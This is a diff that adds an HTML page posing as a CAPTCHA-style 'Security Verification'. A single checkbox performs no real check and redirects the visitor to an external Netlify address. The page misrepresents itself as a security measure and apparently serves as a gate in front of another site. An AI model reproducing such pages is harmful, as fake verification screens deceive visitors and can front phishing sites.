@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Verification</title>
+<meta name="robots" content="noindex,nofollow">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<main class="page">
+  <section class="verify" aria-labelledby="title">
+    <div class="brand-mark" aria-hidden="true"><span>✓</span></div>
+    <h1 id="title">Security Verification</h1>
+    <p class="sub">Please confirm you are a real visitor to continue.</p>
+
+    <div class="check-card">
+      <label class="check">
+        <input id="human" type="checkbox">
+        <span class="box"></span>
+        <span class="label">I'm not a robot</span>
+      </label>
+      <div class="security">
+        <div class="security-icon">✓</div>
+        <strong>SECURE</strong>
+        <small>Privacy · Terms</small>
+      </div>
+    </div>
+
+    <p id="status" class="status">Protected access · Privacy · Terms</p>
+  </section>
+</main>
+
+<script>
+const checkbox = document.getElementById('human');
+const status = document.getElementById('status');
+
+checkbox.addEventListener('change', () => {
+  if (!checkbox.checked) return;
+  status.textContent = 'Verification complete. Redirecting…';
+  // Replace this URL with your actual destination.
+  setTimeout(() => {
+    window.location.href = 'tk-pres.netlify.app/inicio';
+  }, 650);
+});
+</script>
+</body>
+</html>
